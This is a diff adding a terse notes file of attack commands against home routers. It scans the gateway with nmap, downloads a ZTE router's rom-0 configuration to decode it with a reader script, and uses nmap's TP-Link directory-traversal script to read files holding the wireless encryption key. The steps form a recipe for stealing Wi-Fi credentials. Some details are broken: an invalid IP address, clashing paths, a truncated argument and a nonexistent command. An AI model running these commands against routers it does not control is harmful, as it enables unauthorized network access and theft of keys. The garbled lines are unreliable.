@@ -1,0 +1,15 @@
+Open Exploit Database website
+route
+nmap default_ip -vv
+search key
+
+yum search wget
+wget http://192.168.1.1/rom-0
+less rom-0
+ls ZteRomReader.py
+openwith rom-0 ZteRomReader.py
+
+tmp/topology.cnt(Wireless Configuration)
+/temp/ath0.ap_bss(Wireless encryption key)
+nmap -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/tmp/ath0.ap_bss -d -n -Pn<target>
+nmap -p80 --script http-tplink-dir-traversal.nse --script-args rfile=0.ap_bss -d -n -Pn 192.268.0.1
